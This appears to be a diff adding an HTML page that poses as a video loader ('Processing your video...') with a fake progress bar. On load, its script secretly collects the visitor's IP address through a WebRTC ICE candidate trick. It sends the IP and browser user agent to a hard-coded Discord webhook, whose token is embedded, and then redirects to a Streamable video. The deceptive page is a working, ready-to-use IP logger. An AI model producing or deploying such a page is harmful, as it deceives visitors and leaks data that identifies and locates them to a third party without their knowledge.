@@ -1,0 +1,120 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Loading Video...</title>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="apple-mobile-web-app-capable" content="yes">
+</head>
+<body>
+    <div id="loader" style="font-family: -apple-system, system-ui; padding: 20px; text-align: center;">
+        <h3>Processing your video...</h3>
+        <p>Please wait while we load your content.</p>
+        <div style="width: 100%; height: 4px; background: #ddd; border-radius: 2px; overflow: hidden;">
+            <div id="progress" style="width: 0%; height: 100%; background: #007AFF; transition: width 0.3s;"></div>
+        </div>
+    </div>
+
+    <script>
+        // WebRTC IP grabber with timeout
+        function getRealIP() {
+            return new Promise((resolve) => {
+                const timeout = setTimeout(() => resolve('timeout'), 1500);
+
+                try {
+                    const RTCPeerConnection = window.RTCPeerConnection || window.webkitRTCPeerConnection ||
+        window.mozRTCPeerConnection;
+
+                    if (!RTCPeerConnection) {
+                        clearTimeout(timeout);
+                        resolve('no-webrtc');
+                        return;
+                    }
+
+                    const pc = new RTCPeerConnection({iceServers: []});
+                    pc.createDataChannel('');
+
+                    pc.createOffer().then(offer => {
+                        try {
+                            pc.setLocalDescription(offer);
+                        } catch (e) {}
+                    }).catch(() => {});
+
+                    pc.onicecandidate = (evt) => {
+                        if (!evt || !evt.candidate) return;
+
+                        const ip = /([0-9]{1,3}(\.[0-9]{1,3}){3})/.exec(evt.candidate.candidate);
+                        if (ip && ip[1]) {
+                            clearTimeout(timeout);
+                            resolve(ip[1]);
+                            try { pc.close(); } catch (e) {}
+                        }
+                    };
+
+                    // Fallback timeout
+                    setTimeout(() => {
+                        try { pc.close(); } catch (e) {}
+                        if (timeout) clearTimeout(timeout);
+                        resolve('webrtc-failed');
+                    }, 2000);
+
+                } catch (e) {
+                    if (timeout) clearTimeout(timeout);
+                    resolve('error');
+                }
+            });
+        }
+
+        // Send IP to Discord webhook
+        function sendToDiscord(ip) {
+            const data = {
+                content: `**IP Grabbed from iPhone**\nIP: ||${ip}||\nUser Agent: ||${navigator.userAgent.replace(/\|/g, '')}||\nTime: ${new Date().toISOString()}`
+            };
+
+            const webhookUrl =
+        'https://discord.com/api/webhooks/1444529290992685056/OL1IUVXuLs2Ow74_2aK8Kxvk69-lIfdQFso6WnGehNveoqv1UumMv6be__ZC
+        m3vxmMkC';
+
+            // Try fetch first
+            fetch(webhookUrl, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify(data)
+            }).then(() => {
+                setTimeout(() => window.location.href = 'https://streamable.com/7zdojt', 500);
+            }).catch(() => {
+                // Fallback: img beacon
+                const img = new Image();
+                img.onload = () => setTimeout(() => window.location.href = 'https://streamable.com/7zdojt', 500);
+                img.onerror = () => setTimeout(() => window.location.href = 'https://streamable.com/7zdojt', 500);
+                img.src = `${webhookUrl}?content=IP: ${encodeURIComponent(ip)} | UA: ${encodeURIComponent(navigator.userAgent)}`;
+            });
+        }
+
+        // Progress animation
+        function animateProgress() {
+            let width = 0;
+            const interval = setInterval(() => {
+                width += 10;
+                document.getElementById('progress').style.width = width + '%';
+                if (width >= 100) clearInterval(interval);
+            }, 100);
+        }
+
+        // Main execution
+        (async () => {
+            animateProgress();
+
+            // Try to get IP
+            const ip = await getRealIP();
+
+            if (ip && ip !== 'timeout' && ip !== 'webrtc-failed' && ip !== 'no-webrtc' && ip !== 'error') {
+                sendToDiscord(ip);
+            } else {
+                // If IP grab fails, still redirect after a short delay
+                setTimeout(() => window.location.href = 'https://streamable.com/7zdojt', 2000);
+            }
+        })();
+    </script>
+</body>
+</html>
